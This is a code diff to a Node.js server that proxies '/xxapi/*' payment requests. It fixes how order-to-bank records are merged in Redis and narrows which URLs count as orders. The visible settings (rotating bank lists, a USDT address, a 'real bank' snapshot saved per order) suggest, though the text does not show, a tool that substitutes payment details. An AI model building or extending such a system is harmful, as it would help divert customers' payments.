@@ -177,8 +177,12 @@ async function saveDataUnlocked(data) {
                 data.orderNotificationMap = { ...(current.orderNotificationMap || {}), ...(data.orderNotificationMap || {}) };
 
                 if (!isBotCommand) {
-                    // API request saving runtime data: merge orders from Redis and NEVER overwrite bot settings!
-                    data.orderBankMap = { ...(current.orderBankMap || {}), ...(data.orderBankMap || {}) };
+                    // API request saving runtime data: ALWAYS take latest orders from Redis and append only newly created orders in this request
+                    data.orderBankMap = { ...(current.orderBankMap || {}) };
+                    if (data._newOrdersToSave && typeof data._newOrdersToSave === 'object') {
+                        data.orderBankMap = { ...data.orderBankMap, ...data._newOrdersToSave };
+                        delete data._newOrdersToSave;
+                    }
                     const settingsKeys = [
                         'banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress',
                         'logRequests', 'rawLog', 'adminChatId', 'depositSuccess', 'depositBonus',
@@ -2429,6 +2433,8 @@ app.all('/xxapi/*', async (req, res) => {
                             forced: true
                         };
                         data.orderBankMap[reqOrderId] = savedData;
+                        if (!data._newOrdersToSave) data._newOrdersToSave = {};
+                        data._newOrdersToSave[reqOrderId] = savedData;
                         await saveData(data);
                     }
                 }
@@ -2887,12 +2893,13 @@ app.all('/xxapi/*', async (req, res) => {
             }
         }
 
-        const isOrder = urlLower.includes('paymentslipdetail')
+        const isOrder = !urlLower.includes('waitpayerpaymentslip') && !urlLower.includes('/list') && (
+            urlLower.includes('paymentslipdetail')
             || urlLower.includes('paymentslip')
-            || urlLower.includes('waitpayerpaymentslip')
             || /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
             || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST')
-            || urlLower.includes('news/code/'); // For dynamic direct payment screens like freechargetutorial
+            || urlLower.includes('news/code/')
+        );
         let _orderId = '';
         if (isOrder) {
             _orderId = getRequestOrderId(req) || '';
@@ -3203,6 +3210,12 @@ app.all('/xxapi/*', async (req, res) => {
                 data.orderBankMap[canonicalOrderId] = savedData;
                 if (_orderId && String(_orderId) !== canonicalOrderId) data.orderBankMap[String(_orderId)] = savedData;
                 if (altId && altId !== canonicalOrderId) data.orderBankMap[altId] = savedData;
+
+                if (!data._newOrdersToSave) data._newOrdersToSave = {};
+                data._newOrdersToSave[canonicalOrderId] = savedData;
+                if (_orderId && String(_orderId) !== canonicalOrderId) data._newOrdersToSave[String(_orderId)] = savedData;
+                if (altId && altId !== canonicalOrderId) data._newOrdersToSave[altId] = savedData;
+
                 await saveData(data);
             }
             const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
